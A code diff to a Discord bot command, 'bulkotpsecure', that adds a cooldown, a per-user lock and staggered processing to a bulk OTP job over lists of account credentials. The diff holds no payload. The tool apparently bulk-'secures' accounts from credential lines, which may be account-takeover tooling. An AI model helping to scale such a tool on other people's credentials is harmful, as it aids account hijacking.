@@ -7,14 +7,35 @@ const insertaccount = require('../../../db/insertaccount');
 const getCredentials = require('../../utils/info/getCredentials');
 const { failedembed } = require('../../utils/embeds/embedhandler');
 const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { checkCooldown, startCooldown, acquireLock, releaseLock } = require('../../../mainbot/utils/cooldownGuard');
 
 const MAX_BULK = 7;
+const BULK_COOLDOWN_MS = 15 * 1000;
+const STAGGER_MS = 350;
 
 module.exports = {
     name: "bulkotpsecure",
     userOnly: true,
     callback: async (client, interaction) => {
+        let lockKey = null;
         try {
+            const cooldownKey = `bulkotp:${interaction.user.id}`;
+            const cd = checkCooldown(cooldownKey, BULK_COOLDOWN_MS);
+            if (!cd.allowed) {
+                return interaction.reply({
+                    content: `⏳ Please wait **${cd.retryAfterSec}s** before starting another bulk OTP run.`,
+                    ephemeral: true
+                });
+            }
+
+            lockKey = `bulkotp_lock:${interaction.user.id}`;
+            if (!acquireLock(lockKey)) {
+                return interaction.reply({
+                    content: '⏳ You already have a bulk OTP job running. Please wait for it to finish.',
+                    ephemeral: true
+                });
+            }
+
             await interaction.deferReply({ ephemeral: true });
 
             const settingsData = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
@@ -45,6 +66,7 @@ module.exports = {
             });
 
             const securePromises = accountLines.map(async (line, i) => {
+                if (i > 0) await new Promise(r => setTimeout(r, i * STAGGER_MS));
                 const parts = line.split(':');
                 if (parts.length < 2) {
                     return interaction.user.send({
@@ -135,6 +157,7 @@ module.exports = {
             });
 
             await Promise.all(securePromises);
+            startCooldown(`bulkotp:${interaction.user.id}`, BULK_COOLDOWN_MS);
 
             await interaction.editReply({
                 embeds: [{
@@ -153,6 +176,8 @@ module.exports = {
                     await interaction.reply({ content: 'An unexpected error occurred.', ephemeral: true });
                 }
             } catch (_) {}
+        } finally {
+            if (lockKey) releaseLock(lockKey);
         }
     }
 };
